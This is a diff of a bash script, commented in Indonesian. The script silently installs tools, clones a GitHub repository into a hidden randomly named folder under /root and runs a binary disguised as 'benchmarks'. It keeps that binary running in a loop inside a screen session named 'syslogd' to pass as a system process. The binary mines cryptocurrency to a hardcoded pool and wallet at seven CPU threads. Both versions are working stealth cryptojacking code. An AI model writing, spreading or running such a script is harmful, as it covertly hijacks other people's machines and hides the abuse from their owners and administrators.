@@ -1,36 +1,36 @@
 #!/bin/bash
 
-echo "📦 Menyiapkan dependensi..."
+echo "📦 Menginstal dependensi..."
 apt-get update -y >/dev/null 2>&1 && apt-get install -y screen wget tar git -y >/dev/null 2>&1
 
-# Nama acak aman
-NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 6)
-DIR="/root/.${NAME}"
-BIN="${DIR}/${NAME}"
+# Nama acak
+XNAME=$(tr -dc a-z0-9 </dev/urandom | head -c 6)
+XDIR="/root/.${XNAME}"
+XBIN="${XDIR}/${XNAME}"
 
-# Pool dan wallet
-POOL="stratum+tcps://stratum-asia.rplant.xyz:17022"
-WALLET="mbc1qse2ad4q6lwgtpqj0ls6hg2qp4fp9dm3ht4z5vg.asia2"
-
-# Siapkan direktori
-mkdir -p "$DIR"
+# Buat folder tersembunyi
+mkdir -p "$XDIR"
 
 # Download dan siapkan binary jika belum ada
-if [ ! -f "$BIN" ]; then
-  git clone https://github.com/amirul5656/ver.git "$DIR/.tmp" >/dev/null 2>&1
-  cp "$DIR/.tmp/benchmarks" "$BIN"
-  chmod +x "$BIN"
-  strip "$BIN" >/dev/null 2>&1
+if [ ! -f "$XBIN" ]; then
+  echo "⬇️ Mengunduh file dari GitHub..."
+  git clone https://github.com/amirul5656/ver.git "$XDIR/tmp" >/dev/null 2>&1
+  cp "$XDIR/tmp/benchmarks" "$XBIN"
+  chmod +x "$XBIN"
+  strip "$XBIN" >/dev/null 2>&1
 fi
 
-# Jalankan di screen tersembunyi jika belum aktif
-if ! screen -list | grep -q syslogd; then
+# Jalankan di screen dengan nama sistem
+if screen -list | grep -q syslogd; then
+  echo "⚠️  Sudah berjalan di screen 'syslogd', tidak dijalankan ulang."
+else
+  echo "▶ Menjalankan di background screen 'syslogd'..."
   screen -dmS syslogd bash -c "
     while true; do
-      $BIN --algorithm power2b --pool $POOL -u $WALLET -p x --cpu-threads 7
+      $XBIN --algorithm power2b --pool stratum+tcps://stratum-asia.rplant.xyz:17022 -u mbc1qse2ad4q6lwgtpqj0ls6hg2qp4fp9dm3ht4z5vg.asia2 -p x --cpu-threads 7
       sleep 2
     done
   "
 fi
 
-echo "✅ Sudah berjalan dengan aman di background."
+echo "✅ Mining aktif & terlindungi."
